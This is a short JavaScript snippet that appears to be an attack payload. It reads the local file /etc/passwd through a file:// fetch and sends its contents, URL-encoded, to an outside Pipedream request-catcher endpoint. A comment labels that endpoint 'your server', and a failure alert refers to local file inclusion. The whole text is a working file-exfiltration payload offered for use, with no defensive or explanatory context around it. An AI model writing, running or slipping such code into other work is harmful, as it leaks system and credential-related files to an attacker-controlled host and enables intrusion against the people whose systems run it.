fetch('file:///etc/passwd')
  .then(response => response.text())
  .then(text => {
    fetch('https://eoyo36fmz8facye.m.pipedream.net' + encodeURIComponent(text));  // Send file content to your server
  })
  .catch(error => alert('LFI Failed: ' + error.message));
